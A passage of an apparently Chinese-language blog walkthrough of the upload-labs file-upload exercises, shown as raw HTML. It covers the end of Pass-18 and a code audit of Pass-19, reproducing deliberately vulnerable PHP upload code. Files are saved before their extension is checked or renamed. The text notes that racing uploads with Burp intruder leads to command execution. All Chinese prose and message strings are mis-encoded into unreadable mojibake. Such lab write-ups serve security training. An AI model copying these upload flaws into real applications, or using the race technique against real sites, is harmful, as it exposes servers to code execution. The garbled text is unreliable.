class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span>. <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br>             <span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$upload_file</span>, <span class="hljs-variable">$img_path</span>);<br>             <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$upload_file</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç™½åå•çš„æ–‡ä»¶åç¼€æ£€æµ‹ï¼Œå°†ä¸´æ—¶æ–‡ä»¶ä¸Šä¼ åˆ°è·¯å¾„åå†åˆ¤æ–­æ–‡ä»¶æ‹“å±•åæ˜¯å¦åœ¨ç™½åå•ä¸­ï¼Œå¦‚æœåœ¨ç™½åå•ä¸­ï¼Œå°±é‡å‘½åä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶</p><p>å°è¯•æ¡ä»¶ç«äº‰ï¼ŒbpæŠ“åŒ…æ·»åŠ äº†ä¸€ä¸ªæ— å…³ç´§è¦çš„å‚æ•°æ¥æ§åˆ¶çˆ†ç ´æ¬¡æ•°</p><p><img src="/../images/upload-labs/pass_18_1.png"></p><p>å°è¯•è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><p><img src="/../images/upload-labs/pass_18_2.png"></p><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p>ä»£ç å®¡è®¡</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;./myupload.php&quot;</span>);<br>    <span class="hljs-variable">$imgFileName</span> =<span class="hljs-title function_ invoke__">time</span>();<br>    <span class="hljs-variable">$u</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyUpload</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>], <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>],<span class="hljs-variable">$imgFileName</span>);<br>    <span class="hljs-variable">$status_code</span> = <span class="hljs-variable">$u</span>-&gt;<span class="hljs-title function_ invoke__">upload</span>(UPLOAD_PATH);<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$status_code</span>) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$u</span>-&gt;cls_upload_dir . <span class="hljs-variable">$u</span>-&gt;cls_file_rename_to;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ–‡ä»¶å·²ç»è¢«ä¸Šä¼ ï¼Œä½†æ²¡æœ‰é‡å‘½åã€‚&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">1</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;è¿™ä¸ªæ–‡ä»¶ä¸èƒ½ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„ä¸´æ—¶æ–‡ä»¶å­˜å‚¨ç›®å½•ã€‚&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">2</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ ç›®å½•ä¸å¯å†™ã€‚&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">3</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œæ— æ³•ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶ã€‚&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">4</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ çš„æ–‡ä»¶è¿‡å¤§ã€‚&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">5</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å¤±è´¥ï¼ŒæœåŠ¡å™¨å·²ç»å­˜åœ¨ç›¸åŒåç§°æ–‡ä»¶ã€‚&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">6</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ–‡ä»¶æ— æ³•ä¸Šä¼ ï¼Œæ–‡ä»¶ä¸èƒ½å¤åˆ¶åˆ°ç›®æ ‡ç›®å½•ã€‚&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;      <br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æœªçŸ¥é”™è¯¯ï¼&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>myupload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyUpload</span></span>&#123;    <br><br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$cls_upload_dir</span> = <span class="hljs-string">&quot;&quot;</span>;         <span class="hljs-comment">// Directory to upload to.</span><br><span class="hljs-keyword">var</span> <span class="hljs-variable">$cls_filename</span> = <span class="hljs-string">&quot;&quot;</span>;           <span class="hljs-comment">// Name of the upload file.</span><br><span class="hljs-keyword">var</span> <span class="hljs-variable">$cls_tmp_filename</span> = <span class="hljs-string">&quot;&quot;</span>;       <span class="hljs-comment">// TMP file Name (tmp name by php).</span><br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$cls_max_filesize</span> = <span class="hljs-number">33554432</span>; <span class="hljs-comment">// Max file size.</span><br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$cls_filesize</span> =<span class="hljs-string">&quot;&quot;</span>;            <span class="hljs-comment">// Actual file size.</span><br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$cls_arr_ext_accepted</span> = <span class="hljs-keyword">array</span>(<br>      <span class="hljs-string">&quot;.doc&quot;</span>, <span class="hljs-string">&quot;.xls&quot;</span>, <span class="hljs-string">&quot;.txt&quot;</span>, <span class="hljs-string">&quot;.pdf&quot;</span>, <span class="hljs-string">&quot;.gif&quot;</span>, <span class="hljs-string">&quot;.jpg&quot;</span>, <span class="hljs-string">&quot;.zip&quot;</span>, <span class="hljs-string">&quot;.rar&quot;</span>, <span class="hljs-string">&quot;.7z&quot;</span>,<span class="hljs-string">&quot;.ppt&quot;</span>,<br>      <span class="hljs-string">&quot;.html&quot;</span>, <span class="hljs-string">&quot;.xml&quot;</span>, <span class="hljs-string">&quot;.tiff&quot;</span>, <span class="hljs-string">&quot;.jpeg&quot;</span>, <span class="hljs-string">&quot;.png&quot;</span> );<br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$cls_file_exists</span> = <span class="hljs-number">0</span>;         <span class="hljs-comment">// Set to 1 to check if file exist before upload.</span><br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$cls_rename_file</span> = <span class="hljs-number">1</span>;         <span class="hljs-comment">// Set to 1 to rename file after upload.</span><br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$cls_file_rename_to</span> = <span class="hljs-string">&#x27;&#x27;</span>;     <span class="hljs-comment">// New name for the file after upload.</span><br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$cls_verbal</span> = <span class="hljs-number">0</span>;              <span class="hljs-comment">// Set to 1 to return an a string instead of an error code.</span><br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">MyUpload</span>(<span class="hljs-params"> <span class="hljs-variable">$file_name</span>, <span class="hljs-variable">$tmp_file_name</span>, <span class="hljs-variable">$file_size</span>, <span class="hljs-variable">$file_rename_to</span> = <span class="hljs-string">&#x27;&#x27;</span> </span>)</span>&#123;<br>  <br>    <span class="hljs-variable language_">$this</span>-&gt;cls_filename = <span class="hljs-variable">$file_name</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;cls_tmp_filename = <span class="hljs-variable">$tmp_file_name</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;cls_filesize = <span class="hljs-variable">$file_size</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;cls_file_rename_to = <span class="hljs-variable">$file_rename_to</span>;<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isUploadedFile</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <br>    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">is_uploaded_file</span>( <span class="hljs-variable">$this</span>-&gt;cls_tmp_filename ) != <span class="hljs-literal">true</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;IS_UPLOADED_FILE_FAILURE&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setDir</span>(<span class="hljs-params"> <span class="hljs-variable">$dir</span> </span>)</span>&#123;<br>    <br>    <span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">is_writable</span>( <span class="hljs-variable">$dir</span> ) )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;DIRECTORY_FAILURE&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>      <span class="hljs-variable language_">$this</span>-&gt;cls_upload_dir = <span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkExtension</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <br>    <span class="hljs-comment">// Check if the extension is valid</span><br><br>    <span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">in_array</span>( <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-title function_ invoke__">strrchr</span>( <span class="hljs-variable">$this</span>-&gt;cls_filename, <span class="hljs-string">&quot;.&quot;</span> )), <span class="hljs-variable">$this</span>-&gt;cls_arr_ext_accepted ))&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;EXTENSION_FAILURE&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkSize</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_filesize &gt; <span class="hljs-variable language_">$this</span>-&gt;cls_max_filesize )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;FILE_SIZE_FAILURE&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">move</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <br>    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">move_uploaded_file</span>( <span class="hljs-variable">$this</span>-&gt;cls_tmp_filename, <span class="hljs-variable">$this</span>-&gt;cls_upload_dir . <span class="hljs-variable">$this</span>-&gt;cls_filename ) == <span class="hljs-literal">false</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;MOVE_UPLOADED_FILE_FAILURE&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFileExists</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <br>    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">file_exists</span>( <span class="hljs-variable">$this</span>-&gt;cls_upload_dir . <span class="hljs-variable">$this</span>-&gt;cls_filename ) )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;FILE_EXISTS_FAILURE&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">renameFile</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>    <span class="hljs-comment">// if no new name was provided, we use</span><br><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_file_rename_to == <span class="hljs-string">&#x27;&#x27;</span> )&#123;<br><br>      <span class="hljs-variable">$allchar</span> = <span class="hljs-string">&quot;abcdefghijklnmopqrstuvwxyz&quot;</span> ; <br>      <span class="hljs-variable language_">$this</span>-&gt;cls_file_rename_to = <span class="hljs-string">&quot;&quot;</span> ; <br>      <span class="hljs-title function_ invoke__">mt_srand</span> (( <span class="hljs-keyword">double</span>) <span class="hljs-title function_ invoke__">microtime</span>() * <span class="hljs-number">1000000</span> ); <br>      <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt;<span class="hljs-number">8</span> ; <span class="hljs-variable">$i</span>++ )&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cls_file_rename_to .= <span class="hljs-title function_ invoke__">substr</span>( <span class="hljs-variable">$allchar</span>, <span class="hljs-title function_ invoke__">mt_rand</span> (<span class="hljs-number">0</span>,<span class="hljs-number">25</span>), <span class="hljs-number">1</span> ) ; <br>      &#125;<br>    &#125;    <br>    <br>    <span class="hljs-comment">// Remove the extension and put it back on the new file name</span><br><br>    <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">strrchr</span>( <span class="hljs-variable">$this</span>-&gt;cls_filename, <span class="hljs-string">&quot;.&quot;</span> );<br>    <span class="hljs-variable language_">$this</span>-&gt;cls_file_rename_to .= <span class="hljs-variable">$extension</span>;<br>    <br>    <span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">rename</span>( <span class="hljs-variable">$this</span>-&gt;cls_upload_dir . <span class="hljs-variable">$this</span>-&gt;cls_filename, <span class="hljs-variable">$this</span>-&gt;cls_upload_dir . <span class="hljs-variable">$this</span>-&gt;cls_file_rename_to ))&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;RENAME_FAILURE&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"> <span class="hljs-variable">$dir</span> </span>)</span>&#123;<br>    <br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">isUploadedFile</span>();<br>    <br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );<br>    &#125;<br><br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">setDir</span>( <span class="hljs-variable">$dir</span> );<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );<br>    &#125;<br><br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkExtension</span>();<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );<br>    &#125;<br><br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkSize</span>();<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );    <br>    &#125;<br>    <br>    <span class="hljs-comment">// if flag to check if the file exists is set to 1</span><br>    <br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_file_exists == <span class="hljs-number">1</span> )&#123;<br>      <br>      <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkFileExists</span>();<br>      <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );    <br>      &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// if we are here, we are ready to move the file to destination</span><br><br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">move</span>();<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );    <br>    &#125;<br><br>    <span class="hljs-comment">// check if we need to rename the file</span><br><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_rename_file == <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">renameFile</span>();<br>      <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );    <br>      &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// if we are here, everything worked as planned :)</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-string">&quot;SUCCESS&quot;</span> );<br>  <br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">resultUpload</span>(<span class="hljs-params"> <span class="hljs-variable">$flag</span> </span>)</span>&#123;<br><br>    <span class="hljs-keyword">switch</span>( <span class="hljs-variable">$flag</span> )&#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;IS_UPLOADED_FILE_FAILURE&quot;</span> : <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_verbal == <span class="hljs-number">0</span> ) <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>; <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;The file could not be uploaded to the tmp directory of the web server.&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;DIRECTORY_FAILURE&quot;</span>        : <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_verbal == <span class="hljs-number">0</span> ) <span class="hljs-keyword">return</span> -<span class="hljs-number">2</span>; <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;The file could not be uploaded, the directory is not writable.&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;EXTENSION_FAILURE&quot;</span>        : <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_verbal == <span class="hljs-number">0</span> ) <span class="hljs-keyword">return</span> -<span class="hljs-number">3</span>; <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;The file could not be uploaded, this type of file is not accepted.&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;FILE_SIZE_FAILURE&quot;</span>        : <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_verbal == <span class="hljs-number">0</span> ) <span class="hljs-keyword">return</span> -<span class="hljs-number">4</span>; <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;The file could not be uploaded, this file is too big.&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;FILE_EXISTS_FAILURE&quot;</span>      : <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_verbal == <span class="hljs-number">0</span> ) <span class="hljs-keyword">return</span> -<span class="hljs-number">5</span>; <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;The file could not be uploaded, a file with the same name already exists.&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;MOVE_UPLOADED_FILE_FAILURE&quot;</span> : <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_verbal == <span class="hljs-number">0</span> ) <span class="hljs-keyword">return</span> -<span class="hljs-number">6</span>; <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;The file could not be uploaded, the file could not be copied to destination directory.&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;RENAME_FAILURE&quot;</span>           : <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_verbal == <span class="hljs-number">0</span> ) <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>; <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;The file was uploaded but could not be renamed.&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span 